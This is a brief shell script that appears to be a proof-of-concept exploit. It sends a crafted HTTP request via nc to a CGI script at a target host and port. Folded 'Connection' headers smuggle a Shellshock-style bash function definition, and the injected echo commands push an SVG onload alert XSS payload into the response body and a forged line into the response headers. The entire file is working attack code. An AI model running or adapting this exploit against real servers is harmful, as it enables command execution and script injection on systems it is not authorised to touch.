#!/bin/sh
echo -ne "GET /cgi-bin/vuln1.sh HTTP/1.1\r\nHOST: localhost\r\nConnection:    \r\n ()\r\n {<<WHY? Look @ ENV>>\r\nabcd: A\r\nConnection: &};echo \"\r\nabcd: B\r\nConnection: GoesToResponseBody\"'<'s'v'g' o'n'l'o'a'd'='a'l'e'r't'('1')' '>' \"\r\nabcd: C\r\nConnection: \"&echo\r\n -e \"GoesToResponseHeader\x3a@IRSDL\"\r\n\r\n" \ |
nc $1 $2
